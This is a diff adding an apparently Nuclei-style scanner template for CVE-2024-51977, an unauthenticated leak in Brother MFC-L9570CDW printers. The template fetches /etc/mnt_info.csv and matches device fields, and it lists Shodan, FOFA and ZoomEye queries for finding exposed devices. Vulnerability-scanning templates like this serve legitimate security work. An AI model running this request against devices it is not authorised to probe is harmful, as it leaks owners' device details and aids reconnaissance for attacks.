@@ -1,0 +1,43 @@
+id: CVE-2024-51977
+
+info:
+  name: "Brother MFC-L9570CDW 信息泄露漏洞"
+  author: DhiyaneshDK,iamnoooob,darses
+  severity: medium
+  description: |
+    An unauthenticated attacker who can access either the HTTP service (TCP port 80), the HTTPS service (TCP port 443), or the IPP service (TCP port 631), can leak several pieces of sensitive information from a vulnerable device. The URI path /etc/mnt_info.csv can be accessed via a GET request and no authentication is required. The returned result is a comma separated value (CSV) table of information. The leaked information includes the device’s model, firmware version, IP address, and serial number.
+  reference:
+    - https://github.com/sfewer-r7/BrotherVulnerabilities/blob/main/CVE-2024-51977.rb
+  classification:
+    epss-score: 0.55361
+    epss-percentile: 0.97977
+  metadata:
+    verified: true
+    max-request: 1
+    shodan-query: html:"MFC-L9570CDW"
+    fofa-query:
+      - app="brother-Printer"
+    zoomeye-query:
+      - device="brother-Printer" || app="brother-Printer"
+  tags: brother,mfc
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/etc/mnt_info.csv"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '"Model Name"'
+          - '"IP Address"'
+        condition: and
+
+      - type: dsl
+        dsl:
+          - "status_code == 200"
+          - 'contains(content_type, "text/comma-separated-values")'
+        condition: and
+# digest: 4a0a0047304502203a388716947a4ea7008be4f52d18bf3f547301a759b3dd6eadcca87c27db3e3c022100fcb606cd10cd5993e3032ed0e7b5c8fdd8c4216f80037e506b3d3ecf3a17374e:922c64590222798bb761d5b6d8e72950
